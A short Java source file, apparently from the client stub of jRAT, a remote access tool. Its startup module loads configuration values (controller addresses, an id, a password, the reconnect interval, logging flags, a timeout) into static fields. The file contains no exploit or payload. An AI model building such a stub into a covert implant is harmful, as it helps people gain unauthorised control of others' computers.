package se.jrat.stub.modules.startup;

import java.util.Map;

import se.jrat.stub.Configuration;

public class ConfigVarLoaderStartupModule extends StartupModule {

	public ConfigVarLoaderStartupModule(Map<String, String> config) {
		super(config);
	}

	public void run() throws Exception {
		Configuration.addresses = Configuration.getConfig().get("addresses").split(",");
		Configuration.id = Configuration.getConfig().get("id");
		Configuration.pass = Configuration.getConfig().get("pass");
		Configuration.reconnectSeconds = Long.parseLong(Configuration.getConfig().get("reconsec"));
		Configuration.name = Configuration.getConfig().get("name");
		Configuration.errorLogging = Boolean.parseBoolean(Configuration.getConfig().get("error"));
		Configuration.debugMessages = Boolean.parseBoolean(Configuration.getConfig().get("debugmsg"));

		if (Boolean.parseBoolean(Configuration.getConfig().get("timeout"))) {
			Configuration.timeout = Integer.parseInt(Configuration.getConfig().get("toms"));
		} else {
			Configuration.timeout = 1000 * 15;
		}
	}

}
